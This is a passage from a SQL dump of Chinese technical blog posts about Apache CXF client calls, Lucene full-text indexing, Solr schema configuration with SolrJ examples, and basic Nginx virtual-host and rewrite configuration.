http://127.0.0.1:[tomcat端口名]/[tomcat项目名]/service/cxfService?wsd 下载代码(*只需要接口和实体类的Java文件*)\r\n#### cxf.xml注册服务来源\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\r\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \r\nxmlns:jaxws=\"http://cxf.apache.org/jaxws\"\r\nxmlns:soap=\"http://cxf.apache.org/bindings/soap\"\r\nxsi:schemaLocation=\"http://www.springframework.org/schema/beans \r\n					http://www.springframework.org/schema/beans/spring-beans.xsd\r\n					http://cxf.apache.org/bindings/soap \r\n					http://cxf.apache.org/schemas/configuration/soap.xsd\r\n					http://cxf.apache.org/jaxws \r\n					http://cxf.apache.org/schemas/jaxws.xsd\">\r\n	<!-- 引入CXF Bean定义如下,早期的版本中使用 -->\r\n	<import resource=\"classpath:META-INF/cxf/cxf.xml\" />\r\n	<import resource=\"classpath:META-INF/cxf/cxf-extension-soap.xml\" />\r\n	<import resource=\"classpath:META-INF/cxf/cxf-servlet.xml\" />\r\n	\r\n	<!-- 注册CXF客户端代理对象，通过spring框架创建这个代理对象，使用代理对象实现远程调用 -->\r\n	<jaxws:client id=\"myClient\" \r\n				address=\"http://127.0.0.1:9001/cxf-server/service/cxfService\" \r\n				serviceClass=\"tuwq.service.HelloService\">\r\n	</jaxws:client>\r\n</beans>\r\n```\r\n#### 调用服务\r\n```java\r\npublic class App {\r\n	public static void main(String[] args) {\r\n		ApplicationContext ctx = new ClassPathXmlApplicationContext(\"cxf.xml\");\r\n		HelloService service = (HelloService) ctx.getBean(\"myClient\");\r\n		String sayHello = service.sayHello(\"name\");\r\n		System.out.println(sayHello);\r\n	}\r\n}\r\n```\r\n# 总结\r\n- 本文仅仅记录用法,并没有对原理概念讲解\r\n- *远程调用技术必然会被使用到*\r\n- webservice与SpringCloud和Dubbo流行程度和效率不在一个程度上,但是它非常容易入门,很适合了解分布式远程调用', 2, 0, 77, 0, 0, '2018-11-08 17:51:30', '2019-02-22 00:26:14', 0, 0);
INSERT INTO `article` VALUES (39, 1, 'luncene结构与倒排索引', '2018/12/1543746554_49b65802a881e39208f5e1bad988af6c.jpg', '# 前言\r\n本文记录luncene全文检索流程与使用\r\n## luncene是什么\r\n1. lucene是一个基础的*全文检索系统*工具类  \r\n2. lucene是solr框架和大数据*hadoop体系的基础*  \r\n3. lucene搜索支持中文需要第三方分析器  \r\n4. lucene是用来*做搜索的,搜索的,搜索的*\r\n\r\n## 非结构化查询\r\n### 数据的结构化\r\n了解搜索机制,首先要知道数据的结构化\r\n##### 我们生活的数据总体分为两种:结构化数据和非结构化数据\r\n1. 结构化数据: 指*具有固定格式或有限长度*的数据,如数据库,元数据等等\r\n2. 非结构化数据: 指*不定长或无固定格式*的数据,如邮件,文档等文件\r\n\r\n\r\n- 很明显结构化数据有行有列有规律,搜索起来容易\r\n- 非结构化数据无规律且多语义化,搜索难度很大\r\n\r\n***\r\n### 非结构的查询方式\r\n#### 顺序扫描法\r\n1. 所谓顺序扫描,如要找包含某个字符串的文件,就是*一个个文件的看*,对于每一个文件都要从头看到尾。\r\n2. 如果此文档包含该字符串,则放入结果集,继续寻找其他文件有无满足条件的内容,直到扫描完所有文件,如windows的全盘搜索,*执行效率相当的慢*\r\n\r\n#### 全文检索\r\n1. 将非结构化数据中一部分信息提取出来,重新组织,使其变得有一定结构,然后对此有一定结构的数据进行搜索,从而对此有一定结构的搜索,从而达到搜索相对较快的目的。\r\n2. 这部分从非结构化数据中提取出的然后*重新组织的信息*,我们称之为*索引*\r\n3. 字典,字典的*拼音表*和*部首检字表*就相当于字典的索引,对每一个字的解释是非结构化的,如果没有音节表和部首检字表,要在茫茫辞海中找一个字只能用顺序扫描法\r\n4. 有了拼音和部首就可以将指定的信息提取出来进行结构化处理\r\n5. 将读音结构化的细分,分为声母和韵母,分别只有几种可以一一列举\r\n6. 将读音拿出来按一定的顺序排列,每一项读音都指向此字的详细解释的页数\r\n7. 搜索时按结构化的拼音搜到读音,然后按其指向的页数,便可找到我们的非结构化数据\r\n8. *这种先建立索引,再对索引进行搜索的过程就叫做全文检索*\r\n9. 虽然创建索引的过程也是非常耗时的,*但索引一旦创建就可以多次使用*,全文检索主要处理的是查询,所以耗时间创建索引是值得的\r\n10. 谷歌百度经过多年的丰富完善积累,全文检索的性能准确性已经到了其他公司难以并肩的地步\r\n\r\n## 实现全文检索的流程\r\n![lunceneProcess.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1543750093_lunceneProcess.png)\r\n### 获得原始文档\r\n1. 从互联网,数据库,文件系统中*获取需要搜索的原始信息*,这个过程就是信息采集,信息采集的目的是为了对原始内容进行索引\r\n2. *在互联网上采集信息的软件通常称为爬虫或蜘蛛*,爬虫访问互联网上的网页,将获取到的网页内容存储起来成为原始文档\r\n3. 除互联网外,文件系统中的文件也是主要的原始文档信息\r\n\r\n### 创建文档\r\n![lunceneDocuemnt.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1543750204_lunceneDocuemnt.png) \r\n1. 获取原始文档的目的是为了索引,在索引前需要将原始内容创建成文档,文档中包括一个个域,域中存储内容\r\n2. 每个Document可以有多个Field,不同的Document可以有不同的Field,同一个Document*可以有相同的Field*(域名和域值都相同)\r\n3. 每个文档都有一个唯一的编号,就是文档的id\r\n\r\n***\r\n### 分析文档\r\n1. 将原始内容创建为包含域的文档,需要再对域中的内容进行分析,分析的过程是经过对原始文档提取单词,*将字母为小写,去除标点符号,去除停用词*等过程生成最终词汇单元,可以将*语汇单元*理解为一个个的单词,这种就是英文的分析方式\r\n#### 原文档内容：\r\n##### Lucene is a java full-text search engine, lucene is not a complete application,but rather a code library and API that can easily be used to add search capabilities to applications\r\n#### 分析后得到词汇单元,提取的大都是名词,中文根据拼音与部首进行分析\r\n##### lucene,java,full,search,engine，library..\r\n\r\n### 创建索引\r\n1. 每个语汇单元叫做一个Term,*不同的域中拆分出来的相同的单词是不同的的term*,term中包含两部分(一部分是文档的域名,另一部分是单词的内容)\r\n2. 索引Term(key: file_name, value: Vue),Term(key: file_content, value: vue)\r\n3. 根据这些索引便根据*倒排索引*可进行快速的查询操作\r\n\r\n### 倒排索引\r\n![getIndex.png.jpg](http://blog.img.tuwq.cn/upload/artimg/2018/12/1543750323_getIndex.png.jpg)\r\n1. *正排索引结构*是根据文件找到该文件的内容,在文件内容中匹配搜索关键字,这种方法是顺序扫描方法,数据量大,搜索慢\r\n2. 而创建索引是对语汇单元索引,通过词语找文档,这种索引的结构叫做*倒排索引结构*\r\n3. 倒排索引结构是根据内容(词语)找文档,如下图,每个数字代表一个文档的唯一id\r\n4. 随后根据词语所在的文档id去查询,*这样效率相对于正排索引结构就快多了* \r\n\r\n## 基本使用\r\n根据流程进行代码实现\r\n### 创建索引\r\n```java\r\n/**\r\n * 创建索引\r\n * 要准备好原始资源文件 \r\n * @author tuwq\r\n */\r\npublic class CreateIndex {\r\n	/**\r\n	 * 创建索引\r\n	 * 索引文件存储位置及配置\r\n	 * 原始文件读取\r\n	 * 创建域并放入文件\r\n	 * 将文档存入索引库\r\n	 * @throws Exception \r\n	 */\r\n	@Test\r\n	public void create() throws Exception {\r\n		// Directory directoryRAM = new RAMDirectory(); 内存存储索引库\r\n		Directory directory = FSDirectory.open(new File(\"D:\\\\filetemp\\\\luncene\\\\index\"));\r\n		// Analyzer analyzer = new StandardAnalyzer(); 英文分析器\r\n		Analyzer analyzerIKA = new IKAnalyzer(); // 中文分析器\r\n		IndexWriterConfig indexWriterConfig = new IndexWriterConfig(Version.LATEST, analyzerIKA);\r\n		IndexWriter indexWriter = new IndexWriter(directory, indexWriterConfig);\r\n		// 原始文档资源目录\r\n		File dir = new File(\"D:\\\\filetemp\\\\luncene\\\\resource\");\r\n		File[] listFiles = dir.listFiles();\r\n		for (File file: listFiles) {\r\n			Document document = new Document();\r\n			String file_name = file.getName();\r\n			long file_size = FileUtils.sizeOf(file);\r\n			String file_path = file.getPath();\r\n			String file_content = FileUtils.readFileToString(file);\r\n			Field fileNameField = new TextField(\"file_name\", file_name, Store.YES);\r\n			Field fileSizeField = new LongField(\"file_size\", file_size, Store.YES);\r\n			Field filePathField = new StoredField(\"file_path\", file_path);\r\n			Field fileContentField = new TextField(\"file_content\", file_content, Store.YES);\r\n			document.add(fileNameField);\r\n			document.add(fileSizeField);\r\n			document.add(filePathField);\r\n			document.add(fileContentField);\r\n			indexWriter.addDocument(document);\r\n		}\r\n		indexWriter.close();\r\n	}\r\n} \r\n``` \r\n### 域类型\r\nField类 | 数据类型 | 是否分析 | 是否索引 | 说明 \r\n-| :-: |:-: | :-: | :-: |\r\nTextField | String,流 | 是 | 是 | 这个Field用于存储的数据分析和索引,经常使用\r\nLongField | Long | 是 | 是 | 建一个Long数字型Field，进行分析和索引，比如*价格*  \r\nStringField | String | 否 | 是 | 用来构建一个字符串Field，但是不会进行分析，会将整个串存储在索引中\r\nStoredField | 多种类型 | 否 | 否 | 构建不同类型Field,不分析，不索引，但要Field存储在文档中,比如*网页链接* \r\n\r\n##### *创建索引时需要考虑使用何种域类型*\r\n\r\n### 删除索引\r\n```java\r\n/**\r\n * 删除索引\r\n * @author tuwq\r\n */\r\npublic class RemoveIndex {\r\n	/**\r\n	 * 全删除\r\n	 */\r\n	@Test\r\n	public void allRemove() throws Exception {\r\n		IndexWriter indexWriter = this.getIndexWriter();\r\n		indexWriter.deleteAll();\r\n		indexWriter.close();\r\n	}\r\n	/**\r\n	 * 条件删除\r\n	 * @throws Exception\r\n	 */\r\n	@Test\r\n	public void deleteByQuery() throws Exception {\r\n		IndexWriter indexWriter = this.getIndexWriter();\r\n		Query query = new TermQuery(new Term(\"file_content\", \"vue\"));\r\n		indexWriter.deleteDocuments(query);\r\n		indexWriter.close();\r\n	}\r\n	public IndexWriter getIndexWriter() throws Exception {\r\n		Directory directory = FSDirectory.open(new File(\"D:\\\\filetemp\\\\luncene\\\\index\"));\r\n		Analyzer analyzer = new StandardAnalyzer();\r\n		IndexWriterConfig indexWriterConfig = new IndexWriterConfig(Version.LATEST, analyzer);\r\n		IndexWriter indexWriter = new IndexWriter(directory, indexWriterConfig);\r\n		return indexWriter;\r\n	}\r\n} \r\n```\r\n### 修改索引\r\n```java\r\n/**\r\n * 修改索引\r\n * @author tuwq\r\n */\r\npublic class UpdateIndex {\r\n	\r\n	/**\r\n	 * 条件修改\r\n	 * @throws Exception\r\n	 */\r\n	@Test\r\n	public void updateIndex() throws Exception {\r\n		IndexWriter indexWriter = this.getIndexWriter(); \r\n		Document document = new Document();\r\n		document.add(new TextField(\"file_extra\", \"mvvm框架\", Store.YES));\r\n		indexWriter.updateDocument(new Term(\"file_name\", \"vue\"), document, new IKAnalyzer());\r\n	}\r\n	\r\n	public IndexWriter getIndexWriter() throws Exception {\r\n		Directory directory = FSDirectory.open(new File(\"D:\\\\filetemp\\\\luncene\\\\index\"));\r\n		Analyzer analyzer = new StandardAnalyzer();\r\n		IndexWriterConfig indexWriterConfig = new IndexWriterConfig(Version.LATEST, analyzer);\r\n		IndexWriter indexWriter = new IndexWriter(directory, indexWriterConfig);\r\n		return indexWriter;\r\n	}\r\n}\r\n``` \r\n### 查询索引\r\n```java\r\n/**\r\n * 查询索引\r\n * @author tuwq\r\n */\r\npublic class QueryIndex {\r\n	\r\n	/**\r\n	 * 查询所有\r\n	 * @throws Exception\r\n	 */\r\n	@Test\r\n	public void allSearch() throws Exception {\r\n		IndexSearcher indexSearcher = this.getIndexSearcher();\r\n		Query query = new MatchAllDocsQuery();\r\n		this.printResult(indexSearcher, query);\r\n		indexSearcher.getIndexReader().close();\r\n	}\r\n	\r\n	/**\r\n	 * 精准搜索\r\n	 * 根据查询结果遍历文档id\r\n	 * @throws Exception\r\n	 */\r\n	@Test\r\n	public void search() throws Exception {\r\n		IndexSearcher indexSearcher = this.getIndexSearcher();\r\n		Query query = new TermQuery(new Term(\"file_content\", \"react\"));\r\n		this.printResult(indexSearcher, query);\r\n		indexSearcher.getIndexReader().close();\r\n	}\r\n	\r\n	/**\r\n	 * 数字范围查询\r\n	 * @throws Exception\r\n	 */\r\n	@Test\r\n	public void numericRangeQuery() throws Exception {\r\n		IndexSearcher indexSearcher = this.getIndexSearcher();\r\n		Query query = NumericRangeQuery.newLongRange(\"file_size\", 0L, 200L, true, true);\r\n		this.printResult(indexSearcher, query);\r\n		indexSearcher.getIndexReader().close();\r\n	}\r\n	\r\n	/**\r\n	 * 组合查询\r\n	 * @throws Exception\r\n	 */\r\n	@Test\r\n	public void booleanQuery() throws Exception {\r\n		IndexSearcher indexSearcher = this.getIndexSearcher();\r\n		BooleanQuery booleanQuery = new BooleanQuery();\r\n		Query query = new TermQuery(new Term(\"file_content\", \"react\"));\r\n		Query query2 = new TermQuery(new Term(\"file_content\", \"vue\"));\r\n		booleanQuery.add(query, Occur.MUST); // 必须有\r\n		booleanQuery.add(query, Occur.SHOULD); // 可有可无\r\n		this.printResult(indexSearcher, booleanQuery);\r\n		indexSearcher.getIndexReader().close();\r\n	}	\r\n	\r\n	public void printResult(IndexSearcher indexSearcher, Query query) throws Exception {\r\n		TopDocs topDocs = indexSearcher.search(query, 20);\r\n		ScoreDoc[] scoreDocs = topDocs.scoreDocs;\r\n		for (ScoreDoc scoreDoc : scoreDocs) {\r\n			int docId = scoreDoc.doc;\r\n			Document document = indexSearcher.doc(docId);\r\n			System.out.println(document.get(\"file_name\"));\r\n			System.out.println(document.get(\"file_content\"));\r\n			System.out.println(document.get(\"file_path\"));\r\n			System.out.println(document.get(\"file_size\"));\r\n		}\r\n	}\r\n	\r\n	public IndexSearcher getIndexSearcher() throws Exception {\r\n		Directory directory = FSDirectory.open(new File(\"D:\\\\filetemp\\\\luncene\\\\index\"));\r\n		IndexReader indexReader = DirectoryReader.open(directory);\r\n		IndexSearcher indexSearcher = new IndexSearcher(indexReader);\r\n		return indexSearcher;\r\n	}\r\n	\r\n}\r\n```\r\n### 解析查询\r\n```java\r\n/**\r\n * 解析查询\r\n * @author tuwq\r\n */\r\npublic class QueryParserIndex {\r\n\r\n	/**\r\n	 * queryParser语法\r\n	 * @throws Exception\r\n	 */\r\n	@Test\r\n	public void queryParser() throws Exception {\r\n		IndexSearcher indexSearcher = this.getIndexSearcher();\r\n		// 参数1: 默认查询的域,参数2: 分析器\r\n		QueryParser queryParser = new QueryParser(\"file_content\",new IKAnalyzer());\r\n		// Query query = queryParser.parse(\"javascript\");\r\n		// *:* 域:值,添加语法后上面的默认域会失效\r\n		Query query = queryParser.parse(\"+file_content:javascript +file_name:vue\");\r\n		this.printResult(indexSearcher, query);\r\n		this.getIndexSearcher().getIndexReader().close();\r\n	}\r\n	\r\n	/**\r\n	 * 多搜索域\r\n	 * @throws Exception\r\n	 */\r\n	@Test\r\n	public void multiFieldQueryParser() throws Exception {\r\n		IndexSearcher indexSearcher = this.getIndexSearcher();\r\n		// 参数1: 默认查询的域,参数2: 分析器\r\n		MultiFieldQueryParser multiFieldQueryParser = new MultiFieldQueryParser(\r\n				new String[]{\"file_content\",\"file_name\"},new IKAnalyzer());\r\n		// *:* 域:值\r\n		Query query = multiFieldQueryParser.parse(\"+file_content:javascript +file_name:vue\");\r\n		this.printResult(indexSearcher, query);\r\n		this.getIndexSearcher().getIndexReader().close();\r\n	}\r\n	\r\n	public void printResult(IndexSearcher indexSearcher, Query query) throws Exception {\r\n		TopDocs topDocs = indexSearcher.search(query, 20);\r\n		ScoreDoc[] scoreDocs = topDocs.scoreDocs;\r\n		for (ScoreDoc scoreDoc : scoreDocs) {\r\n			int docId = scoreDoc.doc;\r\n			Document document = indexSearcher.doc(docId);\r\n			System.out.println(document.get(\"file_name\"));\r\n			System.out.println(document.get(\"file_content\"));\r\n			System.out.println(document.get(\"file_path\"));\r\n			System.out.println(document.get(\"file_size\"));\r\n		}\r\n	}\r\n	\r\n	public IndexSearcher getIndexSearcher() throws Exception {\r\n		Directory directory = FSDirectory.open(new File(\"D:\\\\filetemp\\\\luncene\\\\index\"));\r\n		IndexReader indexReader = DirectoryReader.open(directory);\r\n		IndexSearcher indexSearcher = new IndexSearcher(indexReader);\r\n		return indexSearcher;\r\n	}\r\n} \r\n```\r\n###### 解析查询有一套查询解析语法,多用于luncene的扩展框架solr中,这里不进行具体解释\r\n# 总结\r\n1. luncene是一个全文检索工具类,并不是框架,无需服务器应用配置\r\n2. luncene是学习solr,elasticsearch与hadoop的基础\r\n3. 学习luncene可以很好的理解全文检索的基础理论', 1, 0, 65, 0, 0, '2018-12-02 18:29:32', '2019-04-13 21:21:30', 0, 0);
INSERT INTO `article` VALUES (40, 1, 'solr', '2018/12/1543986818_cc7e1283bbbe2d3d3616c7894bf7f3b2.jpg', '## 概念\n### solr是什么\n1. solr是一个*全文检索的框架数据库*,较完备的搜索引擎解决方案  \n2. 相比于*luncene*进行了封装,增加便利性,减少工作量  \n3. 相比于*elasticsearch*,显得有些笨重,但社区成熟度最久  \n4. solr目标是一个搜索引擎系统,通过solr可以非常快速的构建搜索引擎实现的*站内搜索*\n\n### 工作流程\n1. solr本质上一个*应用服务端*,单机版可以直接运行tomcat等应用服务器上,只需要一些配置\n2. 用*post*向solr服务器发送一个描述Field及其内容的json,xml文档,solr会根据所提供的内容进行增删改操作\n3. 用*get*向solr服务器进行搜索,进行查询返回xml,json等格式\n4. *像正常的请求处理数据库流程一样*\n5. solr底层使用luncene的API进行索引数据库操作\n\n## 域标签\n#### 域标签是什么\n1. solr中的域就是*luncene中的域概念*\n2. solr默认自带了一些查询域,而不是像luncene一样要全部自己创建\n3. *当solr在操作时找不到所对应的域就会出错,所以solr定义了许多初始化域*\n\n***\n### fieldType\n```xml\n<!-- fieldType域类型 -->\n<!-- name: 域类型名称 -->\n<!-- class: 引入solr的内置域类型 -->\n<!-- precisionStep: 影响索引性能参数 -->\n<!-- positionIncrementGap: 影响索引性能参数 -->\n<fieldType name=\"long\" class=\"solr.TrieLongField\" precisionStep=\"0\" positionIncrementGap=\"0\"/>\n```\n\n\n### field\n```xml\n<!-- field域 -->\n<!-- name: 域名称 -->\n<!-- type: 域类型 -->\n<!-- indexed: 是否索引 -->\n<!-- stored: 是否存储 -->\n<!-- required: 是否必须有(id域必须为true,id域solr中必须自己定义,而不是像luncene自带并自增长) -->\n<!-- multiValued: 是否允许多值(像1,2,3,4这种逗号隔开的list内容) -->\n<field name=\"features\" type=\"text_general\" indexed=\"true\" stored=\"true\" multiValued=\"true\"/>\n```\n\n### dynamicField \n```xml\n<!-- dynamicField动态域 -->\n<!-- name: 域通配符名称 ,如 *_bat匹配 a.bat abc.bat-->\n<!-- 动态域除域通配符外其他属性与普通域一致 -->\n<dynamicField name=\"*_i\"  type=\"int\"    indexed=\"true\"  stored=\"true\"/>\n```\n### uniqueKey\n```xml\n <!-- 文档的唯一主键域名称,当然是id -->\n <uniqueKey>id</uniqueKey>\n```\n\n### copyField\n```xml\n<!-- copyField拷贝合并域 -->\n<!-- source: 原域 -->\n<!-- dest: 指定拷贝至的某域 -->\n<copyField source=\"seller_name\" desc=\'keyword\'\\>\n<copyField source=\"description\" desc=\'keyword\'\\>\n```\n\n##### 相当于一个*合并域*,举个例子\n1. 需要搜索小米,厂商名称或产品描述包含小米都可以\n2. 如果分别搜索如: *seller_name: \'小米\'* 和 *description: \'小米\'* \n3. 如上需要各自搜索一次,为了满足厂商名称或产品描述包含小米都可以\n4. 将厂商名称和产品描述都拷贝合并至关键字域\n```xml\n<!--  搜索seller_name和description时solr内部会直接搜索keyword: 小米 -->\n<!-- 而不是去搜索分别的seller_name和description(这是solr内部会去做的事) -->\n<copyField source=\"seller_name\" desc=\'keyword\'\\>\n<copyField source=\"description\" desc=\'keyword\'\\>\n```\n7. 搜索厂商名称和产品描述时*solr内部会直接搜索keyword: 小米*,而不是去搜索分别的seller_name和description(这是solr内部会去做的事)\n\n\n## 配置自定义域和中文分析器\n##### 基于项目当然不能用solr提供的域,solr可没有提供厂商名称,产品描述这种东西\n##### 配置项目需要定义的一套field域,前提是要配置中文分析器\n### 分析器标签解释 \n```xml\n<fieldType name=\"text_eu\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n    <analyzer>\n       <!-- class: 所使用的分析器类 --> \n       <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n       <!-- class: 分析器的过滤器,对分析后的结果进行过滤细分 -->\n       <filter class=\"solr.LowerCaseFilterFactory\"/>\n       <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_eu.txt\" />\n       <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Basque\"/>\n     </analyzer> \n</fieldType>\n```\n### 配置IKAnalyzer中文分析器\n```xml\n<!-- 配置使用IK分析器的域类型  -->\n<fieldType name=\"text_ik\" class=\"solr.TextField\">\n	<analyzer class=\"org.wltea.analyzer.luncene.IKAnalyzer\">\n</fieldType>\n<!-- 自定义域使用IK分析器进行定义 -->\n<field name=\"seller_name\" type=\"text_ik\" indexed=\"true\" stored=\"true\">\n<field name=\"description\" type=\"text_ik\" indexed=\"true\" stored=\"false\" multiValued=\"true\">\n```\n## 代码操作\nsolrJ是官方提供的操作solr服务端的客户端API\n### 创建和修改\n```java\n/**\n * 创建和修改索引\n * @author tuwq\n *\n */\npublic class CreateIndex {\n	\n	/**\n	 * 域在schema.xml中必须存在\n	 * @throws Exception\n	 */\n	@Test\n	public void createIndex() throws Exception {\n		String baseURL = \"http://localhost:8080/solr/collection1\";\n		SolrServer solrServer = new HttpSolrServer(baseURL);\n		SolrInputDocument doc = new SolrInputDocument();\n		// 如果id已存在,那么就是修改索引\n		doc.setField(\"id\", \"1\");\n		doc.setField(\"name\", \"tuwq\");\n		solrServer.add(doc);\n		solrServer.commit();\n	}\n	\n}\n```\n### 删\n```java\n/**\n * 删除索引\n * @author tuwq\n */\npublic class RemoveIndex {\n	@Test\n	public void delete() throws Exception {\n		String baseURL = \"http://localhost:8080/solr/collection1\";\n		SolrServer solrServer = new HttpSolrServer(baseURL);\n		solrServer.deleteById(\"1\");\n		solrServer.deleteByQuery(\"*:*\", 1000);\n	}\n}\n```\n### 查\n```java\n/**\n * 查找\n * @author tuwq\n */\npublic class QueryIndex {\n	\n	public void allQuery() throws Exception {\n		SolrServer solrServer = this.getSolrServer();\n		SolrQuery solrQuery = new SolrQuery();\n		solrQuery.set(\"q\", \"*:*\");\n		QueryResponse queryResponse = solrServer.query(solrQuery);\n		SolrDocumentList docList = queryResponse.getResults();\n		long numFound = docList.getNumFound(); // 总条数\n		for (SolrDocument doc : docList) {\n			System.out.println(doc.get(\"id\"));\n			System.out.println(doc.get(\"name\"));\n		}\n	}\n	\n	public void conditionQuery() throws Exception {\n		SolrServer solrServer = this.getSolrServer();\n		SolrQuery solrQuery = new SolrQuery();\n		// solrQuery.setQuery(\"category:笔记本电脑\");\n		// 查询\n		solrQuery.set(\"q\", \"category:笔记本电脑\");\n		// 过滤\n		solrQuery.set(\"fq\", \"seller:神舟\");\n		solrQuery.set(\"fq\", \"price:[ * TO 6000]\");\n		// 排序\n		solrQuery.addSort(\"price\", ORDER.desc);\n		// 分页\n		solrQuery.setStart(0);\n		solrQuery.setRows(220);\n		// 默认查询\n		solrQuery.set(\"df\", \"id\");\n		// 只查询\n		solrQuery.set(\"fl\", \"id,name\");\n		// 高亮\n		solrQuery.setHighlight(true);\n		solrQuery.addHighlightField(\"name\");\n		solrQuery.setHighlightSimplePre(\"<span style=\'color:red\'>\");\n		solrQuery.setHighlightSimplePost(\"</span>\");\n		QueryResponse queryResponse = solrServer.query(solrQuery);\n		SolrDocumentList docList = queryResponse.getResults();\n		Map<String, Map<String, List<String>>> highlighting = queryResponse.getHighlighting();\n		long numFound = docList.getNumFound(); // 总条数\n		for (SolrDocument doc : docList) {\n			System.out.println(doc.get(\"id\"));\n			System.out.println(doc.get(\"name\"));\n			Map<String, List<String>> map = highlighting.get(doc.get(\"id\"));\n			List<String> list = map.get(\"name\");\n			String name = list.get(0);\n		}\n	}\n	\n	\n	public SolrServer getSolrServer() {\n		String baseURL = \"http://localhost:8080/solr/collection1\";\n		SolrServer solrServer = new HttpSolrServer(baseURL);\n		return solrServer;\n	}\n}\n```', 1, 0, 65, 0, 0, '2018-12-05 13:13:51', '2019-02-22 00:26:42', 0, 0);
INSERT INTO `article` VALUES (41, 1, 'Nginx基础配置与反向代理及动静分离', '2019/1/1547015262_35853522_p0.jpg', '## 概念\n### 什么是Nginx\n1. Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。\n2. 特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好\n3. 中国大陆使用nginx网站用户有：百度、京东、新浪、网易、腾讯、淘宝等。\n4. 可应用功能: 动静分离,虚拟主机,反向代理,负载均衡,防止DDOS(安全控制),API接口网关(跨域,防盗链)\n\n### 理解DNS\n#### 域名底层转换?底层是怎么找到我们对应的服务器\n![dnsjiexi.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547015614_dnsjiexi.png)\n1. 浏览器通过域名搜索需要先通过本地host文件\n2. 若存在域名与服务器ip的对应关系,直接向浏览器返回关系结果.导致DNS劫持的原因就是因为本地host文件篡改\n3. 不存在则通过网络运营商进行解析,由网络运营商返回关系结果\n4. 域名最终通过DNS解析后,转换为IP地址\n\n## Nginx基础功能配置\n### 请求引导至本地文件\n![nginxroot.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547017474_nginxroot.png)\n```json\nserver {\n	listen       80; // 默认端口80\n	server_name  poi.com; // 请求域名       \n	location / {     // 路由匹配key\n		root /usr/MyProject/; // 映射目录\n		index index.html index.htm // 映射目录下对应默认文件\n	}\n} \n```\n### 端口号区分项目\n![nginxduankhao.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547017664_nginxduankhao.png)\n```json\nserver {\n	listen       3000;	// 请求端口号\n	server_name  poi.com; // 请求域名   \n	location / {   \n		root /usr/jd/;	// 映射目录\n		index index.html index.htm 	// 映射目录下默认读取文件\n	}\n}\nserver {\n	listen       4000;	// 请求端口号\n	server_name  poi.com; // 请求域名   \n	location / {  \n		root /usr/tb/;	// 映射目录\n	    index index.html index.htm 	// 映射目录下默认读取文件\n	}\n} \n```\n### 域名区分项目\n![nginxprefix.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1547017936_nginxprefix.png)\n```json\nserver {\n		listen       80; // 请求端口号\n		server_name  jd.poi.com; // 请求域名   \n	    location / {   \n			root /usr/jd;	// 映射目录\n		    index index.html index.htm 	// 映射目录下默认读取文件\n		}\n}\nserver {\n		listen       80; // 请求端口号\n		server_name  tb.poi.com; // 请求域名   \n		location / {  \n			root /usr/tb;	// 映射目录\n	    	index index.html index.htm 	// 映射目录下默认读取文件\n		}\n}\n``` \n## location表达式与rewrite全局变量\n### location表达式\n#### location正则表达式作用 \n1. location指令的作用是根据用户请求的URI来执行不同的应用,也就是根据用户请求的网站URL进行匹配,匹配成功即进行相关的操作\n\n#### location语法\n| 格式 | 解释 |\n: | :-: |\nlocation =  /uri | = 表示精确匹配，只有完全匹配上才能生效 |\nlocation ^~ /uri | ^~ 开头对URL路径进行前缀匹配，并且在正则之前 | \nlocation ~  pattern | 开头表示区分大小写的正则匹配  |\nlocation ~* pattern | 开头表示不区分大小写的正则匹配 |\nlocation /  uri | 不带任何修饰符，也表示前缀匹配，但是在正则匹配之后  |\nlocation / | 通用匹配，任何未匹配到其它location的请求都会匹配到,相当于switch中的default  |\n\n### rewrite\n#### rewrite作用\n1. Nginx提供的全局变量或自己设置的变量,结合正则表达式和标志位实现url重写以及重定向。\n2. rewrite只能放在server{},location{},if{}中，并且只能对域名后边的除去传递的参数外的字符串起作用。\n3. 通过Rewrite规则，可以实现规范的URL、根据变量来做URL转向及选择配置。\n\n#### rewrite全局变量\n| 格式 | 解释 |\n : | :-: |\n$args | 这个变量等于请求行中的参数,同$query_string |\n$content_length | 请求头中的Content-length字段。 | \n$content_type | 请求头中的Content-Type字段。  |\n$document_root | 当前请求在root指令中指定的值。 |\n$host | 请求主机头字段，否则为服务器名称。  |\n$http_user_agent | 客户端agent信息  | \n$http_cookie | 客户端cookie信息 |\n$limit_rate | 这个变量可以限制连接速率 | \n$request_method | 客户端请求的动作，通常为GET或POST。  |\n$remote_addr | 客户端的IP地址 |\n$remote_port | 客户端的端口  |\n$remote_user | 已经经过AuthBasicModule验证的用户名  |\n$request_filename | 当前请求的文件路径，由root或alias指令与URI请求生成。  |\n$scheme | HTTP方法（如http，https）  |\n$server_protocol | 请求使用的协议，通常是HTTP/1.0或HTTP/1.1  |\n$server_addr | 服务器地址，在完成一次系统调用后可以确定这个值  |\n$server_name| 服务器名称  |\n$server_port | 请求到达服务器的端口号  |\n$request_uri | 包含请求参数的原始URI，不包含主机名，如”/foo/bar.php?arg=baz”  |\n$uri | 不带请求参数的当前URI，$uri不包含主机名，如”/foo/bar.html”,同$document_uri  |\n\n#### 示范\n```java\n// 如果访问者的ip地址为49.185.23.163,则返回403\nif ($remote_addr = 49.185.23.163) {  \n    return 403;   \n}\n// 不允许谷歌浏览器访问\nif ($http_user_agent ~ Chrome) {   \n    return 500;  \n}\n// 只允许通过百度下的域名来源进行访问\nvalid_referers none blocked www.baidu.com *.baidu.com; \nif ($invalid_referer) { 		\n	rewrite ^/ http://myWeb.com/403 redirect; \n}\n``` \n## 反向代理\n### 什么是反向代理\n1. 将请求进行转发,转发到其他的服务器,是负载均衡的前提\n2. *拦截请求,根据配置内部实现转发到真实的服务器地址中,提高安全性*\n3. 负载均衡属于分布式内容,不宜与反向代理归为一类\n\n### 